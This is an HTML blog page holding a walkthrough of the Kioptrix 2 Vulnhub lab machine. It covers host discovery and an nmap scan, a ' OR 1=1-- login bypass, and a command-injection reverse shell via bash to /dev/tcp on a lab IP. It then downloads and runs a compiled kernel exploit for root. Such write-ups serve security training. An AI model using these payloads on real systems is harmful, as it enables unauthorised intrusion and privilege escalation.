@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Kioptrix 2 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Kioptrix 2 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2018-07-17-vulnhub_kioptrix_2_writeups/">Kioptrix 2 - Writeup</a></h4>
+    <h5>July 17, 2018</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="kioptrix-2-writeup">Kioptrix 2 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>Easy machine, which is vulnerable to SQL injection, that gives the possibility to get a reverse shell. While on the machine, we can execute a kernel exploit, that gives us root privileges.</p>
+
+<h2 id="netdiscover">Netdiscover</h2>
+
+<pre><code class="language-bash">root@kali:~# netdiscover
+Currently scanning: 192.168.81.0/16   |   Screen View: Unique Hosts
+ 4 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 240               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.56.13   08:00:27:07:11:52      2     120  PCS Systemtechnik GmbH      
+ 192.168.56.1    0a:00:27:00:00:04      1      60  Unknown vendor              
+ 192.168.56.11   08:00:27:6d:28:27      1      60  PCS Systemtechnik GmbH      
+ 15:44:58 2018 -- 1 IP address (1 host up) scanned in 44.08 seconds
+</code></pre>
+
+<h2 id="nmap">Nmap</h2>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix2# nmap -sV -A -oA nmap 192.168.56.13 -p-
+# Nmap 7.60 scan initiated Tue Mar 27 15:44:14 2018 as: nmap -sV -A -p- -oA nmap 192.168.56.13
+Nmap scan report for 192.168.56.13
+Host is up (0.0030s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey:
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind  2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            707/udp  status
+|_  100024  1            710/tcp  status
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-10-08T00:10:47
+|_Not valid after:  2010-10-08T00:10:47
+|_ssl-date: 2018-03-27T23:44:48+00:00; +3h59m51s from scanner time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|_    SSL2_RC4_128_WITH_MD5
+631/tcp  open  ipp      CUPS 1.1
+| http-methods:
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+710/tcp  open  status   1 (RPC #100024)
+3306/tcp open  mysql    MySQL (unauthorized)
+MAC Address: 08:00:27:07:11:52 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.30
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: mean: 3h59m50s, deviation: 0s, median: 3h59m50s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   3.01 ms 192.168.56.13
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Mar 27 15:44:58 2018 -- 1 IP address (1 host up) scanned in 44.08 seconds
+</code></pre>
+
+<h2 id="index-php">Index.php</h2>
+
+<p>On the login page, we try SQL injection with both username and password as</p>
+
+<pre><code class="language-sql">' OR 1=1--
+</code></pre>
+
+<p>and manage to login.</p>
+
+<p>On the next page, we can execute OS commands, which is obviously vulnerable to command injection. We start a reverse shell, and go ahead with</p>
+
+<pre><code class="language-bash">; bash -i &gt;&amp; /dev/tcp/192.168.56.12/1453 0&gt;&amp;1
+</code></pre>
+
+<p>and wait for the incoming connection.</p>
+
+<h2 id="reverse-shell">Reverse shell</h2>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix2# nc -lvnp 1453
+listening on [any] 1453 ...
+connect to [192.168.56.12] from (UNKNOWN) [192.168.56.13] 32771
+bash: no job control in this shell
+bash-3.00$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.00$ uname -ar
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>The Linux Kernel Version 2.6.9-55.EL is vulnerable. Searching on google for this version leads to following exploit: <b><a><a href="https://www.exploit-db.com/exploits/9545/">https://www.exploit-db.com/exploits/9545/</a></a></b>
+After downloadting the exploit, we can compile it on our machine and serve it via python SimpleHTTPServer:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix2# gcc 9545.c -o exploit
+root@kali:~/vulnhub/kioptrix2# chmod +x exploit
+root@kali:~/vulnhub/kioptrix2# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+192.168.56.13 - - [09/Jul/2018 17:41:43] &quot;GET /exploit HTTP/1.0&quot; 200 -
+</code></pre>
+
+<p>On the victim machine, we have to download the compiled exploit from our local machine and execute it.</p>
+
+<pre><code class="language-bash">bash-3.00$ cd /tmp
+bash-3.00$ wget 192.168.56.12/exploit
+--19:41:51--  http://192.168.56.12/exploit
+           =&gt; `exploit.1'
+Connecting to 192.168.56.12:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13,184 (13K) [application/octet-stream]
+
+    0K .......... ..                                         100%  232.84 MB/s
+
+19:41:51 (232.84 MB/s) - `exploit.1' saved [13184/13184]
+bash-3.00$ ./exploit
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
